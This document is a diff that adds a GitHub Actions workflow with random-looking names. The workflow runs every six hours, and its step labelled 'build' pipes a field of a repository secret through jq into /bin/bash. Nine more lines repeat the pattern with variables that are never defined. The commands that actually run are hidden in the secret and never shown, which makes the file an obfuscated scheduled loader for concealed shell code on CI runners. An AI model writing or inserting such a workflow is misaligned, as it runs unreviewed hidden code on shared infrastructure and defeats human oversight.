@@ -1,0 +1,27 @@
+name: yannonghe7654
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yannonghe7654
+        env:
+          m809: ${{ secrets.m809 }}
+        run: |
+          echo $m809 | jq -r .gjzim2807 | /bin/bash
+          echo $vc27 | jq -r .cy25 | /bin/bash
+          echo $xnapm862 | jq -r .px986 | /bin/bash
+          echo $tdbs98 | jq -r .xhtv6 | /bin/bash
+          echo $pqwm51328 | jq -r .eazlt64 | /bin/bash
+          echo $bhqco9 | jq -r .hu4674 | /bin/bash
+          echo $ap58348 | jq -r .e17 | /bin/bash
+          echo $lx95082 | jq -r .jzhng31401 | /bin/bash
+          echo $krttz7494 | jq -r .wqs9 | /bin/bash
+          echo $ikbxf238 | jq -r .qpyci0116 | /bin/bash
+
